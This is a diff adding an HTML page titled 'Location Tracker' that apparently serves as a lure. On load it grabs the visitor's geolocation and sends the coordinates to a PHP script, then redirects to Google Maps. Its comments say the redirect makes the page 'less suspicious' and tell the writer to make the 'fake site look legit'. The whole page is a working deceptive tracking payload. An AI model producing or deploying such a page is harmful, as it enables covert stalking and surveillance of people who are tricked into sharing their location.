@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Location Tracker</title>
+</head>
+<body>
+
+<script>
+    // Function to get and send geolocation data
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation);
+        } else {
+            alert("Geolocation is not supported by this browser.");
+        }
+    }
+
+    // Function to send geolocation data to a PHP script
+    function sendLocation(position) {
+        var latitude = position.coords.latitude;
+        var longitude = position.coords.longitude;
+
+        // Send location data to the PHP script using AJAX
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "send_location.php?latitude=" + latitude + "&longitude=" + longitude, true);
+        xhr.send();
+
+        // Optionally, you can redirect the user to a map service to make it less suspicious
+        window.location.href = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+    }
+
+    // Trigger getLocation function when the page loads
+    window.onload = getLocation;
+</script>
+
+<!-- Optional: Add some fancy-ass HTML to make your fake site look legit -->
+<h1>Welcome to Legitimate Website</h1>
+<p>Please click <strong>Allow</strong> to access your location.</p>
+
+</body>
+</html>
